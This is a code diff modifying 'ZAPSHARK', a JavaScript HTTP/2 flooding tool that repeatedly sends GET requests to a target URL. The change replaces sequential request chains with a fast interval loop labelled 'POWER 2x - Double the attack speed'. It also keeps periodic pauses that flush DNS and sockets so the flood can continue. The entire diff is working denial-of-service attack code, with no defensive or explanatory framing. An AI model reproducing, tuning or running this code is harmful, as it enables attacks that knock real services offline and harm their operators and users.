@@ -15,73 +15,38 @@ class ZAPSHARK {
         
         // Maintenance
         this.lastMaintenance = Date.now();
-        this.maintenanceInterval = 3600000;
-        this.maintenanceDuration = 600000;
+        this.maintenanceInterval = 3600000; // 1 hour
+        this.maintenanceDuration = 600000;  // 10 minutes
         
         this.client = null;
-        this.attackActive = false;
+        this.attackInterval = null;
     }
 
-    createClient() {
-        try {
-            this.client = http2.connect(this.targetUrl);
-            
-            this.client.on('error', () => {
-                setTimeout(() => this.createClient(), 100);
-            });
-            
-            this.client.on('goaway', () => {
-                setTimeout(() => this.createClient(), 100);
-            });
-            
-        } catch (err) {
-            setTimeout(() => this.createClient(), 100);
-        }
+    async setupClient() {
+        this.client = http2.connect(this.targetUrl);
+        this.client.on('error', (err) => {});
     }
 
     sendRequest() {
-        if (!this.client || this.client.destroyed) {
-            this.createClient();
-            return;
-        }
+        if (!this.client) return;
 
         try {
-            const req = this.client.request({ 
-                ':method': 'GET', 
+            const req = this.client.request({
+                ':method': 'GET',
                 ':path': '/'
             });
             
-            // CONFIRM SENT - then immediately send next
-            req.on('ready', () => {
-                this.totalRequests++;
-                this.requestsSinceLastCalc++;
-                
-                // IMMEDIATE NEXT REQUEST - NO CONCURRENCY
-                if (this.status === "ATTACKING" && this.attackActive) {
-                    setImmediate(() => this.sendRequest());
-                }
-            });
-            
-            req.on('error', () => {
-                this.totalRequests++;
-                this.requestsSinceLastCalc++;
-                
-                // IMMEDIATE NEXT REQUEST - NO CONCURRENCY
-                if (this.status === "ATTACKING" && this.attackActive) {
-                    setImmediate(() => this.sendRequest());
-                }
+            req.on('response', () => {
+                req.destroy();
             });
             
             req.end();
             
         } catch (err) {
+            // Silent fail
+        } finally {
             this.totalRequests++;
             this.requestsSinceLastCalc++;
-            
-            // IMMEDIATE NEXT REQUEST - NO CONCURRENCY
-            if (this.status === "ATTACKING" && this.attackActive) {
-                setImmediate(() => this.sendRequest());
-            }
         }
     }
 
@@ -125,10 +90,9 @@ class ZAPSHARK {
 
     flushSockets() {
         if (this.client) {
-            try { this.client.destroy(); } catch (err) {}
-            this.client = null;
+            this.client.destroy();
+            this.setupClient();
         }
-        setTimeout(() => this.createClient(), 100);
     }
 
     checkMaintenance() {
@@ -137,10 +101,16 @@ class ZAPSHARK {
         
         if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
             this.status = "PAUSED";
-            this.attackActive = false;
+            
             this.flushDNS();
             this.flushSockets();
             
+            // Clear attack interval
+            if (this.attackInterval) {
+                clearInterval(this.attackInterval);
+            }
+            
+            // Resume after 10 minutes
             setTimeout(() => {
                 this.resumeAttack();
             }, this.maintenanceDuration);
@@ -156,45 +126,32 @@ class ZAPSHARK {
     }
 
     startAttack() {
-        this.attackActive = true;
-        
-        // ONLY 2 CHAINS - NO CONCURRENCY
-        for (let i = 0; i < 2; i++) {
-            setImmediate(() => {
-                // Single chain - pure sequential
-                const attackChain = () => {
-                    if (this.status === "ATTACKING" && this.attackActive) {
-                        this.sendRequest();
-                    } else {
-                        setTimeout(attackChain, 100);
-                    }
-                };
-                attackChain();
-            });
-        }
+        // POWER 2x - Double the attack speed
+        this.attackInterval = setInterval(() => {
+            if (this.status === "ATTACKING") {
+                // Send 2 requests per interval for 2x power
+                this.sendRequest();
+                this.sendRequest();
+                this.updateDisplay();
+            }
+        }, 0.1); // Same interval but double requests
     }
 
     async start() {
+        // Clear terminal 2x on start
         process.stdout.write('\x1B[2J\x1B[0f');
         process.stdout.write('\x1B[2J\x1B[0f');
         
-        this.createClient();
+        await this.setupClient();
         
-        // Start attack after brief setup
-        setTimeout(() => {
-            this.startAttack();
-        }, 500);
-        
-        // Update display
-        setInterval(() => {
-            this.updateDisplay();
-        }, 100);
+        this.startAttack();
         
         // Maintenance checker
         setInterval(() => {
             this.checkMaintenance();
         }, 1000);
         
+        // Handle exit
         process.on('SIGINT', () => {
             this.stop();
         });
@@ -202,9 +159,11 @@ class ZAPSHARK {
 
     stop() {
         this.running = false;
-        this.attackActive = false;
+        if (this.attackInterval) {
+            clearInterval(this.attackInterval);
+        }
         if (this.client) {
-            try { this.client.destroy(); } catch (err) {}
+            this.client.destroy();
         }
         process.exit(0);
     }
